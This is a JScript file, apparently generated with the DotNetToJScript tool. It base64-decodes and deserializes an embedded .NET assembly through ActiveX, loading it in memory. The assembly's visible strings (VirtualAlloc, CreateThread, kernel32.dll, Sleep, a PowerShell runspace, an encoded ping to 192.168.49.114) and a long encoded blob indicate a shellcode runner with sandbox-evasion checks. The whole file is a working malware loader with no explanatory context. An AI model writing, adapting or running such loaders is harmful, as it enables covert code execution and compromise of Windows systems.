function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAEVgFYgAAAAAA"+
"AAAA8AAiIAsCMAAAFgAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"+
"AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4MwAA"+
"HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAMBUAAAAgAAAAFgAAAAIAAAAAAAAAAAAAAAAAACAA"+
"AGAucnNyYwAAAAwEAAAAQAAAAAYAAAAYAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUAeCEAAIASAAABAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4CKA8AAAoqIgMoEAAACiYq"+
"AAAAEzAGAAgBAAABAAARcgEAAHAKKBEAAAoLB28SAAAKKBMAAAolB28UAAAKJQZvFQAACiZvFgAA"+
"CiYHbxcAAAooCgAABn4YAAAKIAAQAAAgADAAABoWKAUAAAYmfhgAAAooCQAABiD/AAAAMwEqKBkA"+
"AAoMIBAnAAAoCAAABigZAAAKEwUSBQgoGgAAChMGEgYoGwAACiMAAAAAAAAiQDQBKnIzAABwKBwA"+
"AAoNFhMHKxcJEQcJEQeRG1kg/wAAAF/SnBEHF1gTBxEHCY5pMuIWKB0AAAoJjmkgADAAAB9AKAQA"+
"AAYTBAkWEQQJjmkoHgAAChYoHQAAChYRBBYoHQAAChYWKB0AAAooBgAABhUoBwAABiYqHgIoHwAA"+
"CipCU0pCAQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAAAIBAAAI34AAHQEAAAcBQAAI1N0"+
"cmluZ3MAAAAAkAkAAEAHAAAjVVMA0BAAABAAAAAjR1VJRAAAAOAQAACgAQAAI0Jsb2IAAAAAAAAA"+
"AgAAAUcVAhQJAgAAAPoBMwAWAAABAAAAHQAAAAMAAAALAAAAFgAAAB8AAAAPAAAAAQAAAAEAAAAH"+
"AAAAAQAAAAQAAAABAAAAAADXAgEAAAAAAAYAqQHhAwYAFgLhAwYA4ABoAw8AAQQAAAYACAEoAwYA"+
"dgEoAwYAVwEoAwYA/QEoAwYAyQEoAwYA4gEoAwYAHwEoAwYA9ADCAwYA0gDCAwYAOgEoAwYArgT2"+
"AgoAkwGNAg4ARQOjAgYAAAUzBBIAgQCbAwYAoAD2AgYA/QL2AgoAbgRoAxIADAWbAxIA6wILAwYA"+
"AQBuAhIAmAQLAwYAYQP2AgYA2wT2AgYAZgLCAwAAAAAOAAAAAAABAAEAAQAQAEYEAAA9AAEAAQAC"+
"ABAAmQAAAEUAAQADAEggAAAAAIYYWwMGAAEAUCAAAAAAhgBZBBAAAQBcIAAAAADGAMACkQACAAAA"+
"AACAAJEgMwCXAAMAAAAAAIAAkSAXAJ8ABwAAAAAAgACRIFQAqQANAAAAAACAAJEgoQSzABMAAAAA"+
"AIAAkSA/A7kAFQAAAAAAgACRIEAAvgAWAAAAAACAAJEgZATDABcAcCEAAAAAhhhbAwYAFwAAAAEA"+
"WAIAAAEAxwAAAAEAdgQAAAIAQAIAAAMAqQAAAAQAtQQAAAEAUAQAAAIAdgQAAAMAQAIAAAQAqQAA"+
"AAUAtQQAAAYAYQAAAAEAEAQAAAIANAIAAAMAgAQAAAQATwMAAAUAIwQAAAYASQAAAAEAkQAAAAIA"+
"jAMAAAEAjAMAAAEAXQIJAFsDAQARAFsDBgAZAFsDCgApAFsDEAAxAFsDEAA5AFsDEABBAFsDEABJ"+
"AFsDEABRAFsDEABZAFsDEABhAFsDFQBpAFsDEABxAFsDEACBAFsDFQB5AFsDBgCxANUEGgC5AHsA"+
"MACZAAYDBgDBAMAANQDBAG4AOgDBAMsEQADBAIoARgCZALoABgDZADoDTwChAOMEUgChAI8EVwCp"+
"AHsDXgDhAEcCYgDZAL8EaADpAPsEbQCJAFsDBgAuAAsAxwAuABMA0AAuABsA7wAuACMA+AAuACsA"+
"DQEuADMANwEuADsANwEuAEMA+AAuAEsAPQEuAFMANwEuAFsANwEuAGMAYgEuAGsAjAFDAFsAmQFj"+
"AHMAmQEgAMoCQQEJADMAAQBBAQsAFwABAAABDQBUAAEAAAEPAKEEAQAAAREAPwMBAEABEwBAAAEA"+
"AAEVAGQEAQAEgAAAAQAAAAAAAAAAAAAAAADrBAAAAgAAAAAAAAAAAAAAdgAqAAAAAAACAAAAAAAA"+
"AAAAAAB2APYCAAAAAAIAAAAAAAAAAAAAAH8AowIAAAAAAQAAAAAAAAAAAAAAiAALAwAAAAADAAIA"+
"AAAAQ29sbGVjdGlvbmAxADxNb2R1bGU+AFZpcnR1YWxBbGxvY0V4TnVtYQBtc2NvcmxpYgBWaXJ0"+
"dWFsQWxsb2MARmxzQWxsb2MAbHBUaHJlYWRJZABDcmVhdGVUaHJlYWQAbm5kUHJlZmVycmVkAHNl"+
"dF9SdW5zcGFjZQBDcmVhdGVSdW5zcGFjZQBJbnZva2UAaEhhbmRsZQBTYW1wbGUARGF0ZVRpbWUA"+
"ZmxBbGxvY2F0aW9uVHlwZQBDbG9zZQBDcmVhdGUAc2F2ZWRTdGF0ZQBHdWlkQXR0cmlidXRlAERl"+
"YnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmli"+
"dXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1"+
"dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRy"+
"aWJ1dGUAUnVuSW5zdGFsbGVyQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1"+
"dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFz"+
"c2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1N0"+
"YWNrU2l6ZQBkd1NpemUARnJvbUJhc2U2NFN0cmluZwBwYXRoAGNhbGxiYWNrAE1hcnNoYWwAU3lz"+
"dGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAFN5c3RlbS5Db21wb25lbnRNb2RlbABTeXN0ZW0u"+
"Q29uZmlndXJhdGlvbi5JbnN0YWxsAFVuaW5zdGFsbABrZXJuZWwzMi5kbGwARXhhbXBsZUFzc2Vt"+
"Ymx5LmRsbABQb3dlclNoZWxsAFN5c3RlbQBUaW1lU3BhbgBPcGVuAFN5c3RlbS5NYW5hZ2VtZW50"+
"LkF1dG9tYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24AWmVybwBTbGVlcABJbnN0YWxsZXIAbHBQYXJh"+
"bWV0ZXIALmN0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBnZXRfVG90YWxTZWNvbmRzAGR3"+
"TWlsbGlzZWNvbmRzAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAFN5c3Rl"+
"bS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2Vz"+
"AERlYnVnZ2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRlcwBkd0NyZWF0aW9uRmxhZ3MAU3lzdGVt"+
"LkNvbGxlY3Rpb25zAFRlc3RDbGFzcwBoUHJvY2VzcwBSdW5Qcm9jZXNzAEdldEN1cnJlbnRQcm9j"+
"ZXNzAGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBTdWJ0cmFjdABQU09iamVjdABXYWl0Rm9yU2lu"+
"Z2xlT2JqZWN0AGZsUHJvdGVjdABvcF9FeHBsaWNpdABBZGRTY3JpcHQAU3RhcnQAQ29udmVydABn"+
"ZXRfTm93AEV4YW1wbGVBc3NlbWJseQBDb3B5AElEaWN0aW9uYXJ5AFJ1bnNwYWNlRmFjdG9yeQAA"+
"MXAAaQBuAGcAIAAtAG4AIAA0ACAAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMQA0AAGHCUEAVQAy"+
"AEkANgBmAFgAdAAwAFEAVQBGAEIAVQBaAFcAUgBsAFYAWABWAGsAMAAyADEAMQB0AHEAVABaAEIA"+
"WABaAFUAMgBRAFYAeAAxAE4AawBGAGMAbABVAGoAYgBPAFQAWgBCADMAVgBVADAAVQB2AEUAOQBQ"+
"AFQAVABiAEYAcwBVAEYAbQBnAFEAYwB4AEoAVQBiAEcAegBoAEoARwBCAHMAYgBuADgAbABkAEcA"+
"VgBrADIAUQBWAHkAVwBRAFIAMABGAE4AQgB0AFYAcgBoAG4AMABkAEUAQQBjAFUAaQBuAGMARgBC"+
"AFEAVwBRAGgAWQAwAEYAQgBRAFYATgBpAHMAVgA1AGIARQAwAEcAMQBWAFYASgBrAEUAVQBsAGsA"+
"RQAwAGQAVABnAGIAVgA2AEYAdABTAE4AcwA1AE4AQgBNADUARwBrAEQAbQBOAFQAUQBiAGIAVABU"+
"AGIARgBSAHMAYgBPAEUAcgBGAEcAQgBzAFkAOQA1AFgAcgAyAFUAUQBoAFIASwBRADEASwBQAHQA"+
"WgA2ADMAVgAxAEoAawBFAFUAcABUAGcAYgBWAGEAMABhAFEARQBVADEASgBrAEUAVQBoAFQAZwBi"+
"AFYAUgBwAEEASgBqAFUAWgBkAFQAUQBiAFYAUgBsADEAagBYAGwAOQBHAFgAVQBaAGUAUgBsADkA"+
"TgBpAFAARQBsAFIAbABjAEUANQBWADEARwBYAGwAOQBOAGsAQgBmAHUAVQBBAFEARQBCAEcASgBO"+
"AE4AdQBCAFkAVABzAE4AOABiAG4ATgB1AGMAMgBwADUAQgBVAFoAYgBUAFkANwBtAFQAcwB6AEgA"+
"VQBYAHcAcgBEAEEAVABhAFcARgBoAE4AagB1AFoAWQBYADEASQAyAHgAVgBJADIAegBsAGgAWQBU"+
"AHIAOAAvAFcAMwA2AHMAQgBRAFUARgBCAFEAVABhADcAUgBNAEYAQgBRAFUAMgBQAGoAYwB6AE4A"+
"agBzADkATQB6AGsAKwBNAHoAdwAzAEIAVgA5AE4AagBzAFoATwB6AE0AWABBAEIAZwBVAEYAVQBq"+
"AGIATwBXAEYAaAB2AEMARgBoAE8AdgAxAHkATwBwAE0AcwBGAEIAUQBVAEYAQgBOAHIAdABmAEEA"+
"VQBGAEIAVABSADcAYwBGAHMANwBlAEcAUgBRAE4AbABnADkAZQBrADEASwBkAEYANQBXAE8AbgB0"+
"AHQAWABXAHgAOABPAGwAMAA3AFMAMwBOAFIAYgAxAHAALwBmADEAWQA5AE8ARABWADQATwAyAGQA"+
"ZABWAFgANQB1AFYAWABnADkAYwBWAHQAZgBlAFgAOQBQAGIAawA5ADMAVgBVAGcANABYAEgAOQBH"+
"AGEARgAxAFQAYQBuAHQATwBQAG0AawA2AFAASAA1AG4AVABGAEoAOQBhAEgAVgBwAGUASABGAHMA"+
"YQBqAEkANQBOAGoAaABwAFUAWAA5AFgAYQBGAHgAVgBlAEUAcAB0AGQAegA1ADAAYQBIAEIATgBm"+
"AEgANAAyAGEAVwBRAHkAWAAzAEYASQBjAEcAZABSAFgAawA0AEYAVABZADcARwBXAEYAOQBHAFgA"+
"VgBJADIAegBsAGgATgB2AFEAVQAzAHIAWQBrAEYAQgBRAFUARgBWAFYAaABZAFQAcwB6AEgAOABG"+
"AG8AegBRAEEAVABhAFQAWQA3AEwAYgB3ADkAawBUAFkANwAyAGIAeQBSAGYAVgAyADIARgBPAEEA"+
"VQBGAFQAbwA3AGwAYgB3AGwARwBYAGsANgAvAGUAawB1AGoAaQB3AFUARgBCAFEAVQBFADIAbABJ"+
"ADIAeABWAGgAZgBUAFkANwAyAFUAagBiAE8AVQBqAGIATwBXAEYAaABPAHoATQBjAHkAQwB4ADIA"+
"QQBCAE4AcQBLAHgAWABvAGsAVABjAHoARwBqAFIAZwBGAEIAVQA2AC8AUwBmAFUANgA1AFEAVQBG"+
"AEIAUQBVAEUAMgBrADAARQAxAEgAawBIADgASwAvAHQAVwBnAFUARgBCAFYAaABlAGIAMABWAGYA"+
"VABvADcAVwB4AHUAYwBWAFQAcwB6AEYAQgBSAFUARgBCAFUANgAvAFgAYQBsAFkANgBnAFUARgBC"+
"AFEAVQBFADIAawAyAFkAVwBGAGgATgBqAHUAeABOAGoAdgBaAE4AagB0ADkATwB6AE0AVQBGAEoA"+
"UQBVAEYAVABvADcAKwBUAHIAOABYAG0ANAA3AG4AQgBRAFUARgBCAFEAVABhAFQAWQBqAEoASgBZ"+
"AHIARgBlAGIAZAByAGsAQQB4AE4AQgBzAGkASwB4AFgAcgBYAFgAYwBoAGQAYgB3AFYAZQB3AE8A"+
"VQBpAEwAdwA5AEcAagB0ADgARQAyAGcAPQA9AAAAAPwmOk0O81dNt6AQED40WlcABCABAQgDIAAB"+
"BSABARERBCABAQ4EIAEBAgUAARJZDg8HCA4STRFRHQUYEVERVQgEAAASTQQAABJhBSABARJNBSAB"+
"EmEOCCAAFRJlARJpAgYYBAAAEVEGIAERVRFRAyAADQUAAR0FDgQAARgICAAEAR0FCBgICLd6XFYZ"+
"NOCJCLA/X38R1Qo6CDG/OFatNk41BSABARJJBwAEGBgJCQkJAAYYGBgJCQkJCQAGGBgJGBgJGAUA"+
"AgkYCQQAAQEJBAABCRgDAAAYCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dz"+
"AQgBAAIAAAAAABQBAA9FeGFtcGxlQXNzZW1ibHkAACkBACRFeGFtcGxlIEFzc2VtYmx5IGZvciBE"+
"b3ROZXRUb0pTY3JpcHQAAAUBAAAAACQBAB9Db3B5cmlnaHQgwqkgSmFtZXMgRm9yc2hhdyAyMDE3"+
"AAApAQAkNTY1OThmMWMtNmQ4OC00OTk0LWEzOTItYWYzMzdhYmU1Nzc3AAAMAQAHMS4wLjAuMAAA"+
"BQEAAQAAAAAAAAARWAViAAAAAAIAAAAcAQAAFDQAABQWAABSU0RTtlwctzpwGUGWNSMrLlcUsQEA"+
"AABDOlxVc2Vyc1xVc2VyXERvd25sb2Fkc1xEb3ROZXRUb0pTY3JpcHQtbWFzdGVyXEV4YW1wbGVB"+
"c3NlbWJseVxvYmpceDY0XFJlbGVhc2VcRXhhbXBsZUFzc2VtYmx5LnBkYgAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA"+
"ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAsAMAAAAAAAAAAAAAsAM0AAAAVgBTAF8A"+
"VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA"+
"AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA"+
"BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBBADAAABAFMAdAByAGkAbgBnAEYAaQBs"+
"AGUASQBuAGYAbwAAAOwCAAABADAAMAAwADAAMAA0AGIAMAAAAGIAJQABAEMAbwBtAG0AZQBuAHQA"+
"cwAAAEUAeABhAG0AcABsAGUAIABBAHMAcwBlAG0AYgBsAHkAIABmAG8AcgAgAEQAbwB0AE4AZQB0"+
"AFQAbwBKAFMAYwByAGkAcAB0AAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAA"+
"AABIABAAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQB4AGEAbQBwAGwAZQBB"+
"AHMAcwBlAG0AYgBsAHkAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4A"+
"MAAuADAAAABIABQAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAeABhAG0AcABsAGUAQQBz"+
"AHMAZQBtAGIAbAB5AC4AZABsAGwAAABiAB8AAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQA"+
"AABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIABKAGEAbQBlAHMAIABGAG8AcgBzAGgAYQB3ACAAMgAw"+
"ADEANwAAAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABQABQA"+
"AQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAARQB4AGEAbQBwAGwAZQBBAHMAcwBl"+
"AG0AYgBsAHkALgBkAGwAbAAAAEAAEAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAARQB4AGEA"+
"bQBwAGwAZQBBAHMAcwBlAG0AYgBsAHkAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBv"+
"AG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8A"+
"bgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv"+
"bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA";
var entry_class = 'TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}